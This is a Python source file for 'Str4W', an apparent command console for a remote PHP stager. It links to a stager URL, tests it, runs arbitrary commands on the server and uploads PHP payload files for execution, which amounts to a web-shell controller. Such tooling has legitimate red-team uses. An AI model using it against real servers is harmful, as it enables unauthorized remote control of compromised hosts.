import cmd
import colorama
import functools
import os
import pathlib

from .output import *
from . import util
from . import communication
from . import LOGO

from colorama import Fore

DEFAULT_PROMPT = f"{Fore.CYAN}Str4W{Fore.RESET} >> "


def check_stager_url(func):
    @functools.wraps(func)
    def wrapper(self, *args, **kwargs):
        if self.stager_url is None:
            print_error("Please define a stager URL. You might want to use `link <url>` in order to do that.")
            return

        return func(self, *args, **kwargs)

    return wrapper


class Str4WConsole(cmd.Cmd):
    prompt = DEFAULT_PROMPT

    def __init__(self):
        super().__init__()

        self.stager_url = None
        self.history = []

    # Initialize everything and print the logo
    def preloop(self):
        colorama.init()
        self.show_logo()

    def postcmd(self, stop: bool, line: str):
        self.history.append(line)

        return stop

    def default(self, line: str):
        print_error(f"Unknown command '{line}'.")

    def show_logo(self):
        for line in LOGO.splitlines():
            print(line)
        print()

    def do_link(self, url: str):
        """
        Set the given URL as the stager URL for the current session.
        """

        # Check if the given URL is valid
        if not util.verify_url(url):
            print_error("Invalid URL given. Please check the syntax.")
            return

        if self.stager_url == url:
            print_warning("This stager URL has already been defined.")
            return

        # Another stager has been defined, don't continue
        if self.stager_url is not None:
            print_error("Another stager URL has been defined. Please use `unlink` in order to be able to redefine it "
                        "again.")
            return

        self.stager_url = url
        self.prompt = f"{Fore.RED}LINKED{Fore.RESET} " + DEFAULT_PROMPT
        print_success("Stager URL has been successfully defined.")
        print_info("It is recommended to perform the tests to the stager, using `perform_tests`.")

    @check_stager_url
    def do_unlink(self, line: str):
        """
        Unset the stager URL for the current session.
        """

        self.stager_url = None
        self.prompt = DEFAULT_PROMPT
        print_success("Successfully undefined stager URL.")

    @check_stager_url
    def do_perform_tests(self, line: str):
        """
        Test if the defined stager URL works as expected.
        """

        if not communication.perform_basic_tests(self.stager_url):
            print_error("Basic stager tests have failed. The stager has a very low chance to work correctly. It is not "
                        "recommended to use it.")
            return

        print_success("All tests has been successful. The stager has a very high chance to work correctly.")

    @check_stager_url
    def do_exec(self, line: str):
        """
        Execute the given line and print the response.
        """

        response = communication.execute_command(self.stager_url, line)
        if len(response) > 50:
            if not ask_yn(f"The response size is {len(response)} bytes. Do you want to show it? [Y/N]: "):
                return

        print_info("Stager response: ")
        print(response)

    @check_stager_url
    def do_exec_file(self, filename: str):
        """
        Execute a PHP file on the stager server and print the response.
        """

        file = pathlib.Path(filename)
        if not file.exists():
            print_error("The provided filename does not exist.")
            return

        response = communication.execute_payload(self.stager_url, file.read_text())
        if len(response) > 50:
            if not ask_yn(f"The response size is {len(response)} bytes. Do you want to show it? [Y/N]: "):
                return

        print_info("Stager response: ")
        print(response)

    def do_macro(self, filename: str):
        """
        Execute a series of commands from the given filename locally.
        """
        file = pathlib.Path(filename)
        if not file.exists():
            print_error("The provided filename does not exist.")
            return

        lines = file.read_text().splitlines()

        if not ask_yn(f"There are {len(lines)} commands in this file. Do you want to execute it? [Y/N]: "):
            return

        self.cmdqueue += lines

        print_success(f"Successfully added {len(lines)} commands to the command queue. Executing...")

    def do_mkmacro(self, filename: str):
        """
        Make a macro filename with the current command history with the given filename.
        """

        file = pathlib.Path(filename)
        if file.exists():
            print_error("The provided filename already exists.")
            return

        if len(self.history) == 0:
            print_error("History is empty. Execute some commands first.")
            return

        file.touch()
        file.write_text('\n'.join(self.history))
        print_success(f"Successfully created macro file @ '{str(file)}'!")

    def do_history(self, line: str):
        """
        Print the current command history.
        """

        if len(self.history) == 0:
            print_error("Command history is empty.")
            return

        print_info("Command history: ")
        for command in self.history:
            print(f" - {command}")

    def do_clear_history(self, line: str):
        """
        Clear the command history for the current session. Useful to record macros.
        """

        self.history = []
        print_success("Successfully cleared command history.")

    def do_shell(self, line: str):
        """
        Execute the given command in the native OS terminal. Shortcut: `!<command>`.
        """

        try:
            os.system(line)
        except KeyboardInterrupt:
            print_info("Command execution aborted by user.")

    def do_clear(self, line: str):
        """
        Clear the terminal output as the native terminal would do.
        """

        os.system('cls' if os.name == 'nt' else 'clear')

    def do_exit(self, line: str):
        print(f"{Fore.MAGENTA}Bye bye! Hope to see you again soon!{Fore.RESET}")
        return True
